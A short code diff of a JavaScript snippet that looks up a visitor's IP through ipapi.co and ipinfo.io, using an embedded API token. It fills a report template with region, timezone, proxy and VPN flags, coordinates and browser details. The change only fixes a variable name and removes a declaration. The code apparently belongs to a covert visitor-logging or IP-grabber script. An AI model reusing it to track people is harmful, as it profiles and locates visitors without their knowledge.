@@ -101,8 +101,6 @@ fetch('https://ipapi.co/json/')
   
     let TypeInternet = navigator.connection.effectiveType;
 
-let isProxy, isVPN;
-
 fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
 .then(response => response.json())
 .then(data => {
@@ -118,7 +116,7 @@ fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
     *├ Region: ${region}*
     *├ Timezone IP: ${time}*
     *├ Proxy: ${isProxy}*
-    *├ Vpn: ${isVpn}*
+    *├ Vpn: ${isVPN}*
     *├ Coordinates: ${longitude} ${latitude},*
       * System 🖥*
     *├ Browser: ${browser}*
